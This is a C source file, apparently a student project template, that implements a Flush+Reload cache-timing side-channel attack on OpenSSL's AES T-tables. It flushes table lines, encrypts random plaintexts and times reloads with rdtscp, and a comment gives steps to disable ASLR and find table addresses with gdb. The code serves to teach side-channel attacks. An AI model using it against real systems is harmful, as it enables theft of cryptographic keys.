/*Flush and Reload Attack Template Project 4
Name Surname: Mehmet Sinan INCI
Submission Date:
*/

#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <openssl/aes.h>
#include <assert.h>
#include "math.h"
#include <signal.h>
#include <poll.h>
#include <time.h>

//Use these definitions for the specific types
typedef unsigned char     uint8_t;
typedef unsigned short    uint16_t;
typedef unsigned int      uint32_t;
typedef unsigned long int uint64_t;

unsigned char plaintext[16];
unsigned char ciphertext[16];
unsigned char key[16]={0};
unsigned long time1,time2;


//Flush Function: Flushes the address "p"
inline void clflush(volatile void * p){
	asm volatile ("clflush (%0)" :: "r"(p));
}

//Time stamp function: Takes the clock cycle of the processor
__inline__ void rdtsc(void *m) {
	__asm__ __volatile__ ("rdtscp" : "=a" (*((uint32_t *)(m))), "=d" (*((uint32_t *)(m+4))));
}
		
		
void main(void){

	
	/*Find the location of the forth T-table:
	In the terminal disable ASLR: 
	-echo 0| sudo tee /proc/sys/kernel/randomize_va_space
	Find the location:
	-gdb fnr_template
	-break AES_encrypt
	-run 127.0.0.1
	-p &Te4
	*/
	
	uint64_t address_openssl=0x00007ffff7bb6960;	
	uint64_t *p; // get the address of the t table 4 using gdb
	uint64_t address_aesencrypt=0x400e40;	
	uint64_t *address_ttable=0x4041e0; // address of the t table 4

	unsigned char key1[16];
	unsigned char zero[16];
	unsigned char scrambledzero[16];
	
	//Create the key for AES-128
	AES_KEY expanded;
	AES_set_encrypt_key(key, 128,&expanded);
	clflush((volatile void *)address_openssl);
	int i, j, k, ik;
	unsigned long access_time, time1, time2;
	unsigned char temp;

	//For 100000 times take the measurement

srand(time(NULL));

	for(i=0;i<100000;i++){
		//Create random 16 byte plaintext
		
		for (ik=0;ik<16;ik++){
			plaintext[ik] = rand() % 256;
			//printf("%d\t",plaintext[ik]);
		}
		
	

	//Flush the first cache line T-table

	for (j=0;j<256;j++){		// flushing the t table 4
	clflush(address_ttable+j);
	}

	
	//Encrypt the plaintext
	
	AES_encrypt(plaintext,ciphertext,&expanded);

	//Measure the timing for the reload of the first cache line with rdtsc function. 
	
	rdtsc(&time1);
	temp=*address_ttable;
	rdtsc(&time2);
	access_time = time2-time1;
	
	//Output the ciphertext and the corresponding times to .txt file
	
	for (k=0;k<16;k++){
		printf("%d\t",ciphertext[k]);
	}
	printf("%lu\n", access_time);

	}

}





